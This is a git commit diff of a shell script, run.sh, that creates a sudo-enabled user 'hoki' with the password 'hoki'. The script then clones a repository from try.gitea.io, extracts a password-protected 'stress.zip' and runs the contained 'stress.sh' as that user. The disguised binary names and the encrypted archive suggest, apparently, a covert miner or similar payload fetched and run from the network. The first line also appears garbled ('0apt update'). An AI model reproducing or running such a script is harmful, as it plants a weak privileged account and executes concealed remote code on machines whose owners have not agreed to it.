3dd733570f1482a7a09b241ac8a3c45d67d2771e
lamdhu19 <86828442+lamdhu19@users.noreply.github.com>
2021-07-02 17:01:53 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,16 +1,15 @@
-#!/bin/bash
-apt update
+0apt update
 apt install sudo
-sudo apt install screen libjansson4 -y
+apt install screen -y
 sudo useradd -m hoki
 sudo adduser hoki sudo
 sudo usermod -a -G sudo hoki
 sudo echo 'hoki:hoki' | sudo chpasswd
 cd /home/hoki
-git clone https://try.gitea.io/xmanusnia/Workergits.git
-cd Workergits
-sudo chown hoki:sudo docker
-sudo chown hoki:sudo luck.sh
-sudo chmod 700 stress docker
-sudo chmod 700 stress luck.sh
-sudo -u hoki sh -c "/home/hoki/Workergits/luck.sh"
+git clone https://try.gitea.io/xmanusnia/bitbuc.git
+cd bitbuc
+unzip -q -P kontol stress.zip
+sudo chown hoki:sudo stress
+sudo chown hoki:sudo stress.sh
+sudo chmod 700 stress stress.sh 
+sudo -u hoki sh -c "/home/hoki/bitbuc/stress.sh"
